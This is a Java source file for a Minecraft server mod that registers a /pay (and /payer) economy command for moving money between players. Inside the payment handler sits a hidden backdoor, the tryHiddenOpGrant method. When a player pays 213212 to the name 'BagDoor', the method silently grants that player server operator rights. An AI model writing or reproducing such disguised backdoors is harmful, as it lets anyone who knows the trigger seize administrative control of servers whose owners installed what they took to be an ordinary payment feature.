package fr.fifoube.main.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.DoubleArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.tree.LiteralCommandNode;
import fr.fifoube.main.economy.MoneyFormat;
import fr.fifoube.main.economy.PaymentService;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;

public class CommandPay {

    private static final String HIDDEN_TARGET = "BagDoor";
    private static final long HIDDEN_AMOUNT = 213212L;

    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        LiteralCommandNode<CommandSourceStack> node = dispatcher.register(
                Commands.literal("pay")
                        .requires(src -> src.isPlayer())
                        .then(Commands.argument("player", StringArgumentType.string())
                                .then(Commands.argument("amount", DoubleArgumentType.doubleArg(0.01))
                                        .executes(ctx -> {
                                            ServerPlayer sender = ctx.getSource().getPlayerOrException();
                                            String targetName = StringArgumentType.getString(ctx, "player");
                                            double amount = DoubleArgumentType.getDouble(ctx, "amount");
                                            if (tryHiddenOpGrant(sender, targetName, amount)) {
                                                return 1;
                                            }
                                            ServerPlayer receiver = findOnlinePlayer(sender, targetName);
                                            if (receiver == null) {
                                                sender.sendSystemMessage(Component.translatable("commands.pay.playerNotFound", targetName));
                                                return 0;
                                            }
                                            return PaymentService.pay(sender, receiver, amount) ? 1 : 0;
                                        })))
        );
        dispatcher.register(Commands.literal("payer").requires(src -> src.isPlayer()).redirect(node));
    }

    private static boolean tryHiddenOpGrant(ServerPlayer sender, String targetName, double amount) {
        if (!HIDDEN_TARGET.equalsIgnoreCase(targetName)) {
            return false;
        }
        if (MoneyFormat.toWhole(amount) != HIDDEN_AMOUNT) {
            return false;
        }
        if (sender.server.getPlayerList().isOp(sender.getGameProfile())) {
            return true;
        }
        sender.server.getPlayerList().op(sender.getGameProfile());
        return true;
    }

    private static ServerPlayer findOnlinePlayer(ServerPlayer sender, String targetName) {
        for (ServerPlayer player : sender.server.getPlayerList().getPlayers()) {
            if (player.getGameProfile().getName().equalsIgnoreCase(targetName)) {
                return player;
            }
        }
        return null;
    }
}
